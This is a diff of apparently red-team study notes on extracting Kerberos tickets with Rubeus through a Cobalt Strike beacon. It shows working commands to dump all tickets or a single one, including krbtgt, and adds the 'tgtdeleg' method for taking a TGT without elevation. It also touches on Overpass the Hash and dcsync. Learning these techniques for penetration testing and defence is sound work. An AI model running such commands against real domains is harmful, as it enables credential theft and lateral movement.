@@ -22,16 +22,36 @@ All others are [[Ticket Granting Service (TGS)]] tickets
 All tickets
 `beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump`
 
+---
 A specific ticket
 `beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt`
 
 This will output the ticket(s) in base64 encoded format.
 
   You may also add the `/nowrap` option which will format the base64 encoding onto a single line - this makes copy & pasting much easier.
-  
+
+---
+Using TGT delegation method (non elevated session):
+
+```
+beacon> getuid
+[*] You are DEV\bfarmer
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
+```
+
+Here you will obtain a TGT ticket of your current session.
+
+### 🖊️ via Pivoting
+
+In this section is detailed how you can extract tickets with external tools via pivoting:
+
+- [[Pivoting with Kerberos]]
+
+
 ### ⚠ Rubeus + NTLM hash
 
-If you have the NTLM or AES (can be extracted via [[dcsync]]) hash of a user, you can request a new TGT for that user, using the technique [[Overpass the Hash]]. 
+If you have the NTLM or AES (can be extracted via [[dcsync]] or [[Impacket]] using getTGT, check [[Pivoting with Kerberos]]) hash of a user, you can request a new TGT for that user, using the technique [[Overpass the Hash]]. 
 
 ### Properties
 ---
